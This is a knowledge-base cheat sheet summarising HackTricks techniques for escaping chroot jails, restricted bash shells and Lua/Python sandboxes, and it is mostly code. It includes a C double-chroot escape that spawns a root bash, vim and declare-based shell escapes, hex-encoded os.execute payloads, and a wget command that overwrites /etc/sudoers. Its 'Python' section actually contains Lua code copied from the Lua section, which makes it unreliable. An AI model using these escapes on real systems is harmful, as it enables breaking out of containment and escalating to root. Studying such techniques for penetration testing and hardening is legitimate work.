---
title: "HackTricks: Escaping from Jails"
tags: [linux-hardening, privilege-escalation, shell-escape, chroot]
sources: [hacktricks-escaping-limited-bash.md]
updated: 2026-05-01
---

# HackTricks: Escaping from Jails

Source: [hacktricks-escaping-limited-bash.md](../../raw/hacktricks-escaping-limited-bash.md)

## Key Takeaways

Covers escape techniques for chroot jails, bash restricted shells, and Python/Lua jails. Chroot is **not a security mechanism** against privileged (root) users — it was never designed to prevent intentional escapes by root. GTFOBins is the first reference for any jail escape.

## Chroot Escapes (require root inside chroot)

### Root + CWD (double chroot)

Two chroots cannot coexist. Create a subdirectory, chroot into it, then `chdir("..")` 1000 times, then `chroot(".")`:

```c
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) chdir("..");
chroot(".");
system("/bin/bash");
```

Python and Perl equivalents available via `os.chroot()` / `chroot`.

### Root + Saved FD

Save an FD to the current directory before chrooting, then use `fchdir(fd)` + `chdir("..") * 1000` + `chroot(".")`.

### Root + Mount

Mount the root device (`/`) into a directory inside the chroot, then chroot into it.

### Root + /proc

Mount procfs inside the chroot, find a PID with a different root (e.g., `/proc/1/root`), chroot into it.

## Bash Jail Escapes

```bash
# Check what's available
echo $SHELL; echo $PATH; env; export; pwd

# Modify PATH if writable
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin

# vim escape
:set shell=/bin/sh
:shell

# SSH to get unrestricted bash
ssh -t user@<IP> bash
ssh user@<IP> -t "bash --noprofile -i"

# declare tricks
declare -n PATH; export PATH=/bin; bash -i
BASH_CMDS[shell]=/bin/bash; shell -i

# wget to overwrite sudoers
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

## Python Jail Escapes

```python
# Access debug REPL
debug.debug()

# os.system via encoded chars
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

## Lua Jail Escapes

```lua
-- Get interactive debug shell
debug.debug()

-- Execute via hex-encoded os.execute
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()

-- Enumerate available functions
for k,v in pairs(string) do print(k,v) end
```

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Bypass Bash Restrictions](hacktricks-bypass-bash-restrictions.md)
- [HackTricks: Bypass FS Protections](hacktricks-bypass-fs-protections.md)
- [HackTricks](../entities/hacktricks.md)
